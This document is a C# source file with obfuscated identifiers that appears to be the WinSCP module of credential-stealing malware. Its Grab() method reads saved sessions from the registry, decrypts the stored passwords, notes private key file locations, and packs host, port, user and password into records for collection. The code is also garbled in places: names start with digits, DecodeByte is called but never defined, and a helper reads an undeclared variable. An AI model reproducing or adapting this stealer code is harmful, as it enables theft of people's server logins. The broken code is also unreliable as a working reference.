using System;
using System.Collections.Generic;
using System.Linq;
using C6Zy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class WinSCP : EtbH
	{
		public WinSCP()
		{
			this.3yy = "WinSCP";
		}

		public string 3yy { get; set; }

	public List<WTitxI2m> Grab()
	{
		List<WTitxI2m> list = new List<WTitxI2m>();

		try
		{
			const string regPath = @"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions";

			using (RegistryKey rootKey = Registry.CurrentUser.OpenSubKey(regPath))
			{
				if (rootKey == null)
					return list;

				foreach (string sessionName in rootKey.GetSubKeyNames())
				{
					using (RegistryKey sessionKey = rootKey.OpenSubKey(sessionName))
					{
						if (sessionKey == null)
							continue;

						string host = sessionKey.GetValue("HostName") as string;
						if (string.IsNullOrEmpty(host))
							continue;

						string username = sessionKey.GetValue("UserName") as string;
						string encryptedPassword = sessionKey.GetValue("Password") as string;
						string port = Convert.ToString(
							(int)sessionKey.GetValue("PortNumber", 22)
						);

						string password = WinSCP.LzfXOnttgx(
							username,
							encryptedPassword,
							host
						);

						string publicKey = sessionKey.GetValue("PublicKeyFile") as string;

						if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(publicKey))
						{
							password = $"[PRIVATE KEY LOCATION: \"{Uri.UnescapeDataString(publicKey)}\"]";
						}

						list.Add(new WTitxI2m
						{
							data1 = $"{host}:{port}",
							data2 = username,
							data3 = password,
							data4 = "WinSCP"
						});
					}
				}
			}
		}
		catch
		{
		}

		return list;
	}
	private static int 2vK(List<string> zWren0I)
		{
		int high = int.Parse(data[0]);
		int low = int.Parse(data[1]);

		return 255 ^ (((high << 4) + low ^ 163) & 0xFF);
	}

	private static string LzfXOnttgx(string username, string encPassword, string host)
	{
		try
		{
			if (string.IsNullOrEmpty(username) ||
				string.IsNullOrEmpty(encPassword) ||
				string.IsNullOrEmpty(host))
			{
				return "";
			}

			List<string> hex = new List<string>();
			foreach (char c in encPassword)
			{
				if (c >= 'A' && c <= 'F')
					hex.Add((c - 'A' + 10).ToString());
				else
					hex.Add(c.ToString());
			}

			int value = DecodeByte(hex);
			if (value == 255)
			{
				value = DecodeByte(hex);
			}

			hex = hex.Skip(4).ToList();

			int length = DecodeByte(hex);
			hex = hex.Skip(2).ToList();

			int skip = DecodeByte(hex) * 2;
			hex = hex.Skip(skip).ToList();

			StringBuilder decrypted = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char ch = (char)DecodeByte(hex);
				decrypted.Append(ch);

				hex.RemoveAt(0);
				hex.RemoveAt(0);
			}

			string key = username + host;
			string result = decrypted.ToString();

			int index = result.IndexOf(key, StringComparison.Ordinal);
			if (index >= 0)
			{
				result = result.Substring(index + key.Length);
			}

			return result;
		}
		catch
		{
			return "";
		}
	}
}

